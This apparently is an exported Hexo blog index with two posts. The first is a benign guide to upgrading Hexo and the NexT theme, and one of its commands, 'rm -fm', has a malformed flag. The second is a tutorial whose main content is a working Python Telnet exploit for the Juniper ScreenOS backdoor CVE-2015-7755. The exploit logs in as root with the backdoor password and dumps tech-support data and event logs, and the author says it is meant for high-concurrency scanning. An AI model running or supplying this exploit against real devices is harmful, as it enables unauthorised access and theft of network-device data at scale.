<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="更新-hexo"><a href="#更新-hexo" class="headerlink" title="更新 hexo"></a>更新 hexo</h2><p>进入blog目录，执行如下命令：</p>
<ul>
<li>更新package.json中的hexo及个插件版本  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm-check</span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br></pre></td></tr></table></figure></li>
<li>更新hexo及所有插件  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure></li>
<li>确认hexo版本号是否已更新  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure>

</li>
</ul>
<div class="note warning">
            <h3 id="潜在错误"><a href="#潜在错误" class="headerlink" title="潜在错误"></a>潜在错误</h3><p>此时运行 hexo generate 命令，若出现了如下错误：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">DTraceProviderBindings MODULE_NOT_FOUND;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>通过重新安装 `hexo-cli` 可以解决<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-cli -g</span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
          </div>

<h2 id="更新-Next-主题"><a href="#更新-Next-主题" class="headerlink" title="更新 Next 主题"></a>更新 Next 主题</h2><h3 id="备份（可选）"><a href="#备份（可选）" class="headerlink" title="备份（可选）"></a>备份（可选）</h3><p>我备份了如下旧配置文件：</p>
<ul>
<li><code>{blog_dir}/themes/next/_config.yml</code></li>
<li><code>{blog_dir}/themes/next/languages/en.yml</code></li>
<li><code>{blog_dir}/themes/next/languages/zh-Hans.yml</code></li>
<li><code>{blog_dir}/themes/next/source/404.yml</code></li>
</ul>
<p>后来发现新版Next变化太大，很多配置项和方式都变了。<br>但是旧文件可以作为过去喜好的参考。</p>
<h3 id="更新-Next"><a href="#更新-Next" class="headerlink" title="更新 Next"></a>更新 Next</h3><p>想要更新Next时，发现已经有了天翻地覆的变化，连github的项目目录都变了，该项目已经社区化：</p>
<ul>
<li>旧目录 <code>~ v5.x</code>：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lpc3NuYW4vaGV4by10aGVtZS1uZXh0">https://github.com/iissnan/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li>
<li>新目录 <code>v6.x ~</code>：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0">https://github.com/theme-next/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<ul>
<li>删除旧的 next  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -fm themes/next</span><br></pre></td></tr></table></figure></li>
<li>克隆最新的 next  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="配置-Next"><a href="#配置-Next" class="headerlink" title="配置 Next"></a>配置 Next</h3><p>从官方文档获悉，Next的配置变了很多。</p>
<p>其实首先该插一句，官网也变了。。。</p>
<ul>
<li>旧官网：<span class="exturl" data-url="aHR0cHM6Ly9ub3Rlcy5paXNzbmFuLmNvbS8=">https://notes.iissnan.com/<i class="fa fa-external-link-alt"></i></span></li>
<li>新官网：<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy8=">https://theme-next.org/<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>新Next的配置文件，有2种设置方式，请参考官方文档：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">官方中文<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">官方英文<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>每个人的配置不尽相同，我只是简单的配置了一部分，这里给出大佬们的非常全面的配置以供参考</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly90ZGluZy50b3AvYXJjaGl2ZXMvNDJjMzhiMTAuaHRtbA==">Hexo-NexT (v7.0+) 主题配置<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU0JUI4JUJCJUU5JUEyJTk4JUU3JUJFJThFJUU1JThDJTk2Lmh0bWw=">Next主题美化(仅7.1版本)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="定制-Next"><a href="#定制-Next" class="headerlink" title="定制 Next"></a>定制 Next</h3><h4 id="Dark-Mode-暗色背景（夜间模式）"><a href="#Dark-Mode-暗色背景（夜间模式）" class="headerlink" title="Dark Mode 暗色背景（夜间模式）"></a>Dark Mode 暗色背景（夜间模式）</h4><p>这部分内容较多，我单独写到了另一篇文章里 <a href="/tech/hexo-dark-mode-note/">Hexo（Next主题）Dark Mode(暗色背景/夜间模式)折腾笔记</a></p>
<h4 id="代码块Mac-Panel特效"><a href="#代码块Mac-Panel特效" class="headerlink" title="代码块Mac Panel特效"></a>代码块Mac Panel特效</h4><p>这个属于美化，我没有尝试，请参见<span class="exturl" data-url="aHR0cHM6Ly9oYXNhaWsuY29tL3Bvc3RzL2Q3Mzk5ZTgwLmh0bWw=">大佬的订制<i class="fa fa-external-link-alt"></i></span>。</p>
<h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><ol>
<li>当前版本的Next 相关文章（<code>hexo-related-popular-posts</code>插件）<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlYTMvaGV4by1yZWxhdGVkLXBvcHVsYXItcG9zdHMvaXNzdWVzLzIx">无法使用<i class="fa fa-external-link-alt"></i></span>，不知道是不是我的姿势不对</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRlY2guc2l0ZS96aC1DTi8zYmEzYmU5Lw==">Hexo版本升级指南<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vZW50cnkvNWI5NjUxOTVlNTFkNDUwZTU1MTlkMmM0">Hexo的DTraceProviderBindings MODULE_NOT_FOUND问题<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZXZlbmNoby5naXRodWIuaW8vYXJjaGl2ZXMvMTQ1MzRiZWIuaHRtbA==">Hexo博客NexT主题从v5.x.x更新到v6.x.x的记录及总结<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1s">Next升级+Mac迁移<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hexo Next</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇</title>
    <url>/tech/shell-interaction-in-python-1-telnet/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>我们常常需要使用编程语言实现与某些终端交互，以实现交互过程的可控性。具体到这类涉及终端交互的漏洞，只有编写合适的PoC/Exp，并与目标有正确的交互逻辑，才能进行漏洞验证。</p>
<p>这里，我们以Juniper后门漏洞CVE-2015-7755为例，介绍如何使用Python编写Telnet交互程序，且:</p>
<ul>
<li>要求该程序是可以用于高并发扫描的。</li>
<li>实现Exp，获取相关敏感信息。</li>
</ul>
<p>Juniper后门漏洞相关信息可参见<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzkwMzIzLmh0bWw=">Freebuf相关文章<i class="fa fa-external-link-alt"></i></span>。简而言之，即可使用任意用户名及密码 <strong>*&lt;&lt;&lt; %s(un=’%s’) = %u*</strong> 来登录一些Juniper ScreenOS设备的Telnet及SSh服务。</p>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><h4 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h4><p>初版PoC程序我使用了相对底层的socket模块来简单实现，用于检测单个目标没有问题，但在高并发扫描的时候效率极低，猜测是I/O阻塞的原因。</p>
<p>转而使用系统库内置模块telnetlib：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3RlbG5ldGxpYi5odG1s">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi90ZWxuZXRsaWIucHk=">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>使用telnet模块后并发扫描的效率就非常高了，CPU及带宽占用率都上去了。简单翻阅telnetlib的源码，发现它是有I/O控制的。</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>Juniper设备使用get命令来获取设备的各类信息，可以使用 <em><strong>get ?</strong></em> 来查看相关命令，其中最重要的是2个：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>但存在一个问题，如上2个命令返回的全部信息总量通常比较大，一般&gt;=40KB，而服务端不是一次性将信息全部输出给客户端的，而是分批输出到管道中的，客户端需要不断地键入回车，来顺序获取各个信息分段。</p>
<p>这就要求程序能不断获取结果信息，并正确判断最后一个分段以适时终止。</p>
<a id="more"></a>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, ret, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>

<p>代码说明：</p>
<ul>
<li>5 - 21行：实现了exp函数，用于在执行某个命令cmd，并获取全部的返回信息。其中， <strong>-&gt;</strong> 字符串是juniper的shell输入提示符，我们通过判断它来过滤掉上一次的多余输出。在连续获取结果分段的过程中，若出现超时，则会最多尝试maxTo次。</li>
<li>23 - 42行：主代码逻辑，登陆了远端telnet，并执行了?命令，判断返回的信息中是否包含success_flag变量对应的字符串，默认是’ping other host’，若存在则断定存在该漏洞。若doExp为True，则表示执行Exp，则程序会调用exp()函数分别执行上节中提到2个get命令并获取全部返回信息。 _<strong>这里需要特别指出的是，返回的techsupport字符串中可能含有各种特殊编码的字符串，因此若需对其进行转码操作请再三考虑，以防改变原始数据</strong>_。</li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Security</tag>
        <tag>CVE</tag>
        <tag>PoC/Exp</tag>
        <tag>Vul</tag>
        <tag>Telnet</tag>
      </tags>
  </entry>
</search>
